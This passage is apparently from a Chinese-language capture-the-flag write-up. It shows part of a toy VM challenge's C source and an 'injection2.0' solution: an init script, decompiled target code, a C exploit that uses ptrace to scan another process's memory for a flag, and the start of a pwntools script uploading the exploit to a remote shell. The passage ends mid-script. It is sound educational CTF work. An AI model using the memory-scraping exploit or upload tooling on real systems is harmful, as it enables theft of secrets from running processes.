&#123;</span><br><span class="line">                </span><br><span class="line">                HRP_OPEN(REG[RDI],REG[RSI]);</span><br><span class="line">              &#125;</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;write&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RAX]=b;</span><br><span class="line">              <span class="keyword">if</span>(REG[RAX]==<span class="number">1</span>)</span><br><span class="line">              &#123;  </span><br><span class="line">                HRP_WRITE(REG[RDI],REG[RSI],REG[RDX]);</span><br><span class="line">              &#125;</span><br><span class="line">              </span><br><span class="line">            &#125;  </span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:<span class="built_in">puts</span>(<span class="string">&quot;INVAID IS!&quot;</span>);<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HRP_WRITE</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> buf,<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(buf==HF[i].fd)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(HF[i].mod!=<span class="number">1001</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;MOD CAN WRITE&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        write(fd,HF[i].file_content,size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HRP_OPEN</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> mod)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(fd==HF[i].fd)</span><br><span class="line">    &#123;</span><br><span class="line">      HF[i].mod=mod;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  clearScreen();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;NOT FOUND,PLEASE NEW FILE&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;FILE NAME: &quot;</span>);</span><br><span class="line">  <span class="type">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%16s[^\n ]&quot;</span>,name);</span><br><span class="line">  getchar();</span><br><span class="line">  deleEnter(name);</span><br><span class="line">  create_file(name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *debug_cmd[]=&#123;<span class="string">&quot;id\x00&quot;</span>,<span class="string">&quot;file input\x00&quot;</span>,<span class="string">&quot;file out\x00&quot;</span>,<span class="string">&quot;exit\x00&quot;</span>,<span class="string">&quot;mmap\x00&quot;</span>&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">charge_file</span><span class="params">(<span class="type">char</span> *op)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(op,<span class="string">&quot;file input&quot;</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;FILE NAME:&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *name=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x1000</span>];</span><br><span class="line">    read(<span class="number">0</span>,name,<span class="number">0x20</span>);</span><br><span class="line">    deleEnter(name);</span><br><span class="line">    FILE * fp1 = fopen(name, <span class="string">&quot;ab+&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (fp1==<span class="literal">NULL</span>) &#123;<span class="comment">//è‹¥æ‰“å¼€æ–‡ä»¶å¤±è´¥åˆ™é€€å‡º</span></span><br><span class="line">          perror(fopen);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span>(i=<span class="number">0</span>;<span class="built_in">fscanf</span>(fp1,<span class="string">&quot;%c&quot;</span>,a+i)!=EOF;i++);</span><br><span class="line">      fclose(fp1);<span class="comment">//å…³é—­è¾“å…¥æ–‡ä»¶</span></span><br><span class="line">    </span><br><span class="line">    HF[file_count].fd=global_fd;</span><br><span class="line">    HF[file_count].filename=name;</span><br><span class="line">    HF[file_count].mod=<span class="number">1000</span>;</span><br><span class="line">    HF[file_count].file_content=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strncpy</span>(HF[file_count].file_content,a,<span class="number">0x1000</span>);</span><br><span class="line">    file_count++;</span><br><span class="line">    global_fd++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(op,<span class="string">&quot;file out&quot;</span>))</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> DEBUG()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]DEBUGING&quot;</span>);</span><br><span class="line">  <span class="type">char</span> choice[<span class="number">0x20</span>];</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;[+][DEBUGING]root# &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,choice,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(debug_cmd[<span class="number">0</span>],choice,<span class="built_in">strlen</span>(debug_cmd[<span class="number">0</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;uid=%d  gid=%d\n&quot;</span>,users.uid,users.gid );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(debug_cmd[<span class="number">1</span>],choice,<span class="built_in">strlen</span>(debug_cmd[<span class="number">1</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      deleEnter(choice);</span><br><span class="line">      charge_file(choice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(debug_cmd[<span class="number">2</span>],choice,<span class="built_in">strlen</span>(debug_cmd[<span class="number">2</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      deleEnter(choice);</span><br><span class="line">      charge_file(choice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(debug_cmd[<span class="number">3</span>],choice,<span class="built_in">strlen</span>(debug_cmd[<span class="number">3</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      deleEnter(choice);</span><br><span class="line">      users.gid=<span class="number">1000</span>;</span><br><span class="line">      users.uid=<span class="number">1000</span>;</span><br><span class="line">      <span class="built_in">strncpy</span>(users.holder,<span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>,<span class="number">8</span>);</span><br><span class="line">      machine_start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(debug_cmd[<span class="number">4</span>],choice,<span class="built_in">strlen</span>(debug_cmd[<span class="number">4</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr=<span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[+]ADDR EXPEND:&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;addr);</span><br><span class="line">      mmap((<span class="type">void</span> *)addr, <span class="number">1024LL</span>, PROT_READ|PROT_WRITE, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">rm</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,HF[i].filename))</span><br><span class="line">    &#123;  </span><br><span class="line">      </span><br><span class="line">      HF[file_count].fd=<span class="literal">NULL</span>;</span><br><span class="line">      HF[file_count].filename=<span class="literal">NULL</span>;</span><br><span class="line">      HF[file_count].mod=<span class="number">1000</span>;</span><br><span class="line">      HF[file_count].file_content=<span class="literal">NULL</span>;</span><br><span class="line">      file_count--;</span><br><span class="line">      global_fd--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *system_cmd[]=&#123;<span class="string">&quot;ls\x00&quot;</span>,<span class="string">&quot;id\x00&quot;</span>,<span class="string">&quot;file\x00&quot;</span>,<span class="string">&quot;cat\x00&quot;</span>,<span class="string">&quot;./\x00&quot;</span>,<span class="string">&quot;reg\x00&quot;</span>,<span class="string">&quot;DEBUG\x00&quot;</span>,<span class="string">&quot;reboot\x00&quot;</span>,<span class="string">&quot;shutdown\x00&quot;</span>,<span class="string">&quot;rm\x00&quot;</span>&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">machine_start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *tmp;</span><br><span class="line">  tmp=(<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    write_HRP(<span class="number">1</span>,<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;HRP-MACHINE$ &quot;</span>));</span><br><span class="line">    read(<span class="number">0</span>,tmp,<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">0</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">0</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      ls();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">1</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">1</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;uid=%d  gid=%d\n&quot;</span>,users.uid,users.gid );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">2</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">2</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      clearScreen();</span><br><span class="line">      <span class="type">char</span> *name=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;FILE NAME: &quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%16s[^\n ]&quot;</span>,name);</span><br><span class="line">      getchar();</span><br><span class="line">      deleEnter(name);</span><br><span class="line">      create_file(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">3</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">3</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *exec;</span><br><span class="line">         exec = strtok(tmp, <span class="string">&quot; &quot;</span>);</span><br><span class="line">         exec = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">         deleEnter(exec);</span><br><span class="line">         cat(exec);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">4</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">4</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *exec;</span><br><span class="line">         exec = strtok(tmp, <span class="string">&quot;./&quot;</span>);</span><br><span class="line">         deleEnter(exec);</span><br><span class="line">         vm_elf(exec);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">5</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">5</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;RDI:%lld RSI:%lld RDX:%lld RAX:%lld\n&quot;</span>,REG[RDI],REG[RSI],REG[RDX],REG[RAX]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">6</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">6</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(users.gid==<span class="number">0</span>&amp;&amp;users.uid==<span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        DEBUG();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">7</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">7</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      clearScreen();</span><br><span class="line">      boot();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">8</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">8</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      clearScreen();</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">9</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">9</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *exec;</span><br><span class="line">         exec = strtok(tmp, <span class="string">&quot; &quot;</span>);</span><br><span class="line">         exec = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">         deleEnter(exec);</span><br><span class="line">         rm(exec);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">boot</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  write_banner();</span><br><span class="line">  login_system();</span><br><span class="line">  <span class="keyword">if</span>(login_if==<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    REG[RDI]=<span class="number">0</span>;</span><br><span class="line">    REG[RSI]=<span class="number">0</span>;</span><br><span class="line">    REG[RDX]=<span class="number">0</span>;</span><br><span class="line">    REG[RAX]=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> check=check_repeat_reboot(<span class="string">&quot;README&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!check)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">goto</span> start;</span><br><span class="line">    &#125;</span><br><span class="line">    HF[file_count].fd=global_fd;</span><br><span class="line">    HF[file_count].filename=<span class="string">&quot;README&quot;</span>;</span><br><span class="line">    HF[file_count].mod=<span class="number">1001</span>;</span><br><span class="line">    HF[file_count].file_content=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strncpy</span>(HF[file_count].file_content,<span class="string">&quot;Welcome my machine,you can use it to make some easy file or exec some file. Now let me show u an easy asm //open mov rdi,1;mov rsi,1001;call open 2; just like this u can open a file.\n&quot;</span>,<span class="number">0x1000</span>);</span><br><span class="line">    deleEnter(HF[file_count].file_content);</span><br><span class="line">    file_count++;</span><br><span class="line">    global_fd++;</span><br><span class="line"></span><br><span class="line">start:    machine_start();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  boot();</span><br><span class="line">  </span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="injection2-0ğŸ’‰"><a href="#injection2-0ğŸ’‰" class="headerlink" title="injection2.0ğŸ’‰"></a>injection2.0ğŸ’‰</h3><p>é¢˜ç›®æä¾›çš„initæ–‡ä»¶åˆ†æ</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">chown 0:0 flag</span><br><span class="line">chmod 755 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">./target &gt;pso.file 2&gt;&amp;1 &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">#setsid /bin/cttyhack setuidgid 0 /bin/sh # ä¿®æ”¹ uid gid ä¸º 0 ä»¥ææƒ /bin/sh è‡³ rootã€‚</span><br><span class="line">poweroff -f # è®¾ç½® shell é€€å‡ºååˆ™å…³é—­æœºå™¨</span><br></pre></td></tr></table></figure>

<p>echo 0 | tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope</p>
<p>.&#x2F;target &gt;pso.file 2&gt;&amp;1 &amp;</p>
<p>setsid &#x2F;bin&#x2F;cttyhack setuidgid 0 &#x2F;bin&#x2F;sh</p>
<p>è¿™3å¥æ˜¯å…³é”®ï¼Œç°åœ¨æ˜¯rootï¼Œç„¶åå¼€å¯äº†ptraceï¼Œå¹¶ä¸”æŠŠtargetç¨‹åºæŒ‚åˆ°äº†åå°</p>
<p>target</p>
<p>è¯»å–flagåˆ°æ ˆä¸Šåå°±æ­»å¾ªç¯è¾“å‡ºhelloworld</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;./flag&quot;</span>, <span class="number">436</span>, envp);</span><br><span class="line">  read(fd, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  system(<span class="string">&quot;rm flag&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello World\n&quot;</span>, <span class="number">0xC</span>uLL);</span><br><span class="line">    sleep(<span class="number">2u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æ€è·¯</p>
<p>rootä¸‹å¯ä½¿ç”¨ptraceæ¥å£ï¼Œç›´æ¥åˆ©ç”¨ptraceæœç´¢è¿›ç¨‹å†…å­˜ï¼Œps -efè·å–åˆ°è¿›ç¨‹çš„PID å†å»&#x2F;proc&#x2F;pid&#x2F;mapsè·å–åˆ°æ ˆåœ°å€</p>
<p>åˆ©ç”¨ptraceè·å–æ ˆå†…æ•°æ®æ¯”å¯¹flagæ ¼å¼å­—ç¬¦ä¸²ï¼Œæˆ‘æœ¬åœ°æµ‹è¯•ç”¨çš„flagæ ¼å¼å°±æ˜¯flag{}</p>
<p>è¿˜æœ‰ä¸€ä¸ªå°ç»†èŠ‚ï¼Œæˆ‘çš„qemué‡Œé¢æ”¾äº†soæ–‡ä»¶å¯ä»¥è·‘åŠ¨æ€é“¾æ¥ç¨‹åºã€‚</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="comment">//cat /proc/131/maps</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argv , <span class="type">char</span> **argc)</span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> data ;</span><br><span class="line">  <span class="type">int</span> stat ;</span><br><span class="line">  <span class="type">int</span> pid = atoi(argc[<span class="number">1</span>]) ;</span><br><span class="line">  ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>) ;</span><br><span class="line">  wait(&amp;stat) ;    <span class="comment">// å¦‚æœä¸waitï¼Œé©¬ä¸Šè¿›è¡Œä¸‹ä¸€ä¸ªptraceçš„PEEKæ“ä½œä¼šé€ æˆ no such process é”™è¯¯</span></span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr = <span class="number">0</span> ;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>,&amp;addr);</span><br><span class="line">  <span class="keyword">for</span> (; addr &lt; <span class="number">0x7ffffffff000</span>; ++addr)</span><br><span class="line">  &#123;</span><br><span class="line">    data = ptrace(PTRACE_PEEKDATA, pid, addr, <span class="literal">NULL</span>);    <span class="comment">// ä¸€æ¬¡è¯»ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line">    <span class="keyword">if</span>(data==<span class="number">0x65636165</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;data = %x , addr = %llx\n&quot;</span> , data , addr) ;</span><br><span class="line">      <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr1=addr<span class="number">-1</span>;</span><br><span class="line">      <span class="type">char</span> data1;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">      &#123;</span><br><span class="line">        addr1+=<span class="number">1</span>;</span><br><span class="line">        data1 = ptrace(PTRACE_PEEKDATA, pid, addr1, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">//write(1,data1,0x10);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span> , data1) ;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä¸Šä¼ è„šæœ¬"><a href="#ä¸Šä¼ è„šæœ¬" class="headerlink" title="ä¸Šä¼ è„šæœ¬"></a>ä¸Šä¼ è„šæœ¬</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./boot.sh&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;&quot;</span>,<span class="number">53408</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    io.sendline(cmd)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;# &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">exp</span>):</span><br><span class="line">    p = log.progress(<span class="string">&quot;Upload&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./&quot;</span>+exp, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;# &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">600</span>):</span><br><span class="line">        p.status(<span class="string">&quot;%d / %d&quot;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">&quot;echo \&quot;%s\&quot; &gt;&gt; /tmp/benc&quot;</span> % (encoded[i:i+<span class="number">600</span>]))</span><br><span class="line"></span><br><span class="line">    exec_cmd(<span class="string">&quot;cat 